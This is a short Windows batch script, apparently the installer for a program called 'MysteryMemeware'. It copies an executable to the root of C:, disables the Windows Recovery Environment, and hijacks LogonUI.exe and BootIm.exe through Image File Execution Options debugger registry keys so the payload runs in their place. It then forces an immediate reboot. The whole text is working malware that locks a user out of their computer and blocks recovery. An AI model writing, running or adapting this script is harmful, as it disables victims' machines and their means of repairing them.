copy /Y "%~dp0MysteryMemeware2.exe" "C:\MysteryMemeware.exe"
copy /Y "%~dp0MysteryMemeware.exe" "C:\MysteryMemeware.exe"
reagentc /Disable
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LogonUI.exe" /v Debugger /t REG_SZ /f /d "C:\MysteryMemeware.exe"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\BootIm.exe" /v Debugger /t REG_SZ /f /d "C:\MysteryMemeware.exe"
shutdown /r /t 0